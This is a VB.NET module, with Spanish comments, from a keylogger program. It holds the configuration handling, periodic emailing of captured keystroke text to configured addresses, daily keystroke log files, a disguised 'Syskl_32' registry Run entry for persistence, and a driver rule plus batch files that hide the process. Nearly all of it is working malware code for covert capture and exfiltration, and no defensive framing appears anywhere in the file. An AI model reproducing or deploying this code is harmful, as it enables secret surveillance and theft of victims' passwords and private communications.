Imports System.Net.Mail
Imports System.Text.RegularExpressions

Module mdlKL


#Region "Declaracion de variables"

    Public conf As String
    Public cfg() As String
    Public MyMailMesagge As New MailMessage
    Public smtp As New SmtpClient
    Public resultado As Integer
    Public time_ini As Date
    Public time_ini_log As Date
    Public Asciis_Prohibidos As New List(Of Integer)
    Public aplicado As Boolean = False

#End Region

    '********************* FUNCIONES PUBLICAS ************************

#Region "Configuraciones"

    Public Sub LeerConfiguracion()
        On Error Resume Next
        'Lee archivo y guarda en un arreglo de String
        conf = IO.File.ReadAllText(Application.StartupPath & "\config.txt")
        cfg = conf.Split(":")
    End Sub

    Public Function FrecuenciaEnvio() As Integer
        On Error Resume Next
        'Devuelve la Frecuencia con la que se enviarán correos (de la configuracion)
        Return CInt(cfg(0))
    End Function

    Public Function FrecuenciaLog() As Integer
        On Error Resume Next
        'Devuelve la Frecuencia con la que se guardarán LOGS (de la configuracion)
        Return CInt(cfg(1))
    End Function

    Public Function CheckIniciarAutomatico() As Boolean
        On Error Resume Next
        'Devuelve True o False, segun la configuracion de iniciar automaticamente los envios y guardados
        Return CBool(cfg(2))
    End Function

    Public Function LetraCombinacionTeclas() As String
        On Error Resume Next
        'Devuelve la letra con la que se mostrará/ocultará el programa junto a CTRL+ALT+SHIFT
        Return cfg(3)
    End Function

    Public Function ObtenerPassword() As String
        On Error Resume Next
        'Obtiene el password (String) configurado para mostrar el programa luego de digitada la combinacion
        Return cfg(4)
    End Function

    Public Function ObtenerArrancaSistema() As Boolean
        On Error Resume Next
        'Devuelve True/False según esté configurado el arrancar KeyLogger con Windows
        Return cfg(5)
    End Function

    Public Sub ListaCorreos()
        On Error Resume Next
        'Añade a la lista de correos, los que estén en la configuracion
        frmKL.lbCorreos.Items.Clear()
        If cfg.Length > 6 Then
            For i = 6 To cfg.Length - 1
                If cfg(i) <> "" Then
                    frmKL.lbCorreos.Items.Add(cfg(i))
                End If
            Next
        End If
    End Sub

    Public Sub GuardarConfiguracionActual()
        On Error Resume Next
        'Crea archivo de configuración, según datos del formulario
        If Not IO.File.Exists(Application.StartupPath & "\config.txt") Then
            CrearArchivoConfiguracion()
        End If

        Dim str As String
        str = CInt(frmKL.nMinutosEnvio.Value) & _
                ":" & CInt(frmKL.nMinutosLog.Value) & ":" & frmKL.chkInicioAutomatico.Checked & _
                ":" & frmKL.cmbLetra.Text & ":" & frmKL.txtPassword.Text & ":" & frmKL.chkArrancarSistema.Checked & ":"

        For i = 0 To frmKL.lbCorreos.Items.Count - 1
            str &= frmKL.lbCorreos.Items(i) & ":"
        Next
        IO.File.WriteAllText(Application.StartupPath & "\config.txt", str)
        MsgBox("Configuraciones guardadas con éxito.", vbInformation, "KeyLogger")
    End Sub

    Public Sub CargarConfiguraciones()
        On Error Resume Next
        'Lee el archivo de configuracion
        If Not IO.File.Exists(Application.StartupPath & "\config.txt") Then
            CrearArchivoConfiguracion()
        End If
        LeerConfiguracion()
        frmKL.nMinutosEnvio.Value = FrecuenciaEnvio()
        frmKL.nMinutosLog.Value = FrecuenciaLog()
        frmKL.chkInicioAutomatico.Checked = CheckIniciarAutomatico()
        frmKL.cmbLetra.Text = LetraCombinacionTeclas()
        frmKL.txtPassword.Text = ObtenerPassword()
        frmKL.chkArrancarSistema.Checked = ObtenerArrancaSistema()
        ListaCorreos()
    End Sub

    Public Sub CrearArchivoConfiguracion()
        On Error Resume Next
        'Crea un archivo de configuración por defecto, si no existe
        IO.File.WriteAllText(Application.StartupPath & "\config.txt", "1:1:False:H:1234:False:")
    End Sub

#End Region



#Region "Validaciones"

    Public Function CorreoValido(ByVal mail As String)
        On Error Resume Next
        'Usa una expresion regular para validar un correo electrónico
        Return Regex.IsMatch(mail, "^([\w-]+\.)*?[\w-]+@[\w-]+\.([\w-]+\.)*?[\w]+$")
    End Function

#End Region



#Region "CRUD"

    Public Sub AgregarCorreoLista(ByRef TextBox As TextBox, ByRef ListBox As ListBox)
        On Error Resume Next
        'Agrega un correo electrónico validado a la lista del formulario
        If CorreoValido(TextBox.Text) = False Then
            MessageBox.Show("Dirección de correo electrónico inválida, el correo debe seguir el formato: usuario@dominio", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            TextBox.Focus()
            TextBox.SelectAll()
        Else
            ListBox.Items.Add(TextBox.Text)
            TextBox.Text = ""
        End If
    End Sub

    Public Sub QuitarSeleccionadoLista(ByRef lista As ListBox)
        On Error Resume Next
        'Elimina el item seleccionado de la lista de correos del formulario
        If lista.SelectedIndex <> -1 Then
            lista.Items.Remove(lista.SelectedItem)
        Else
            MsgBox("No ha seleccionado ningún ítem de correo", vbExclamation, "Error")
        End If
    End Sub

    Public Sub EnviarCorreo(ByRef body As TextBox, ByVal ListaCorreos As ListBox)
        'Envia correo electrónico
        Try
            Dim i As Integer
            If DateDiff(DateInterval.Minute, time_ini, Date.Now) >= CInt(FrecuenciaEnvio()) And CInt(FrecuenciaEnvio()) <> 0 Then
                time_ini = Date.Now
                MyMailMesagge.To.Clear()
                MyMailMesagge.Body = "----------------------" & vbCrLf & _
                                    body.Text & vbCrLf & _
                                    "----------------------" & _
                                    "Fecha y Hora: " & DateTime.Now

                For i = 0 To ListaCorreos.Items.Count - 1
                    MyMailMesagge.To.Add(ListaCorreos.Items(i).ToString())
                Next
                If body.Text <> "" Then
                    smtp.Send(MyMailMesagge)
                    body.Text = ""
                End If
            End If
        Catch

        End Try
    End Sub

    Public Sub CrearRegistroInicio()
        'Crea registro para iniciar con windows
        If frmKL.chkArrancarSistema.Checked Then
            Dim rk = My.Computer.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
            rk.SetValue("Syskl_32", Application.StartupPath & "\InitKL.exe")
        End If
    End Sub

    Public Sub GuardarLOG(ByRef body As TextBox)
        On Error Resume Next
        'Crea archivo LOG (1 por dia), y lo modifica segun frecuencia configurada
        If DateDiff(DateInterval.Minute, time_ini_log, Date.Now) >= CInt(FrecuenciaLog()) And CInt(FrecuenciaLog()) <> 0 Then
            time_ini_log = Date.Now

            If Not My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\LOG") Then
                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\LOG")
            End If

            Dim fecha As Date = Date.Now
            Dim strFecha As String = FormatDateTime(fecha, DateFormat.ShortDate)
            Dim strNombre As String = "KL_" & strFecha & ".txt"
            strNombre = strNombre.Replace("/", "-")

            Dim strKL As String = vbCrLf
            strKL &= "------------------------------" & vbCrLf
            strKL &= body.Text & vbCrLf
            strKL &= "------------------------------" & vbCrLf
            strKL &= "Hora: " & FormatDateTime(fecha, DateFormat.ShortTime) & vbCrLf

            If My.Computer.FileSystem.FileExists(Application.StartupPath & "\LOG\" & strNombre) Then
                If body.Text <> "" Then
                    IO.File.AppendAllText(Application.StartupPath & "\LOG\" & strNombre, strKL)
                End If
            Else
                If body.Text <> "" Then
                    IO.File.WriteAllText(Application.StartupPath & "\LOG\" & strNombre, strKL)
                End If
            End If
        End If
    End Sub

#End Region



#Region "Mostrar/Ocultar proceso"

    Public Sub OcultarProceso()
        On Error Resume Next
        'Oculta el proceso de éste prograna
        Shell("2-Iniciar.bat", AppWinStyle.Hide, True)
        DriverWork.AddRule(DriverWork.Rules.ADD_PROCESS_RULE, "keylogger*;*;*")
    End Sub

    Public Sub DesocultarProceso()
        On Error Resume Next
        'Muestra proceso de éste programa
        DriverWork.AddRule(DriverWork.Rules.DELETE_PROCESS_RULE, "keylogger*;*;*")
        Shell("3-Detener.bat", AppWinStyle.Hide, True)
    End Sub

#End Region


    '****************** FIN FUNCIONES PUBLICAS ************************

End Module
